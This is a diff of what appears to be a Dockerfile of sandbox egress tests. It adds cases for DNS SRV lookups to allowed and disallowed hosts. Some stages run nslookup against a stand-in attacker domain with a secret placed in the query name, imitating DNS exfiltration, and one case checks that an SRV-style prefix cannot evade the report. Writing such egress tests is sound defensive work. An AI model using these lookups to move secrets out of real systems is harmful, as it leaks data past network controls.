@@ -273,6 +273,21 @@ RUN echo "=== [DNS-only exfiltration] ===" && \
     (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
     echo "queried"
 
+# [Service discovery, host allowed]
+# apt asks for this on every repository it fetches from, and falls back to the
+# plain name when nothing comes back. The build works; reporting the lookup as
+# blocked would fail it anyway.
+RUN echo "=== [Service discovery, host allowed] ===" && \
+    (nslookup -type=SRV _http._tcp.allowed.example.com >/dev/null 2>&1 || true) && \
+    echo "queried"
+
+# [Service discovery, host not allowed]
+# Prefixing `_a._tcp.` must not be a way out of the report, so the verb above
+# is held to names under a host the rules allow.
+RUN echo "=== [Service discovery, host not allowed] ===" && \
+    (nslookup -type=SRV _mongodb._tcp.SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true) && \
+    echo "queried"
+
 # [Reverse lookup]
 # Nothing in the cage has a name, so the only question is how the lookup ends.
 # A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
